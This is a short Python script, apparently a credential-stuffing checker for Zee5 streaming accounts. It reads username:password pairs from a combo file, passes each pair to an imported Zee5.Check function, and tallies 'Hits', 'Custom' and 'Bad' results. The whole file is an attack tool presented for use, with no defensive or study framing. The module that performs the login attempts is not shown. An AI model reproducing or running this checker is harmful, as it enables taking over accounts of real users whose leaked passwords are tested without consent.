import Zee5,threading,termcolor,colorama
colorama.init()
path = "/sdcard/Combo.txt" # Enter Your Combo
file = open(path).readlines()
Zee5.clear()
for line in file:
	line = line.replace('\n','')
	if ":" in line:
		t = threading.Thread(target=Zee5.Check,args=(line.split(':')[0],line.split(':')[1],))
		t.start()
		t.join()
termcolor.cprint(f'\n\n #Combo Stats -> \n [^] Total = {str(len(file))} \n [+]Hits  >  {Zee5.hit}\n [~] Custom  >  {Zee5.custom}\n [-]Bad  >  {Zee5.bad}','cyan',attrs = ["bold"])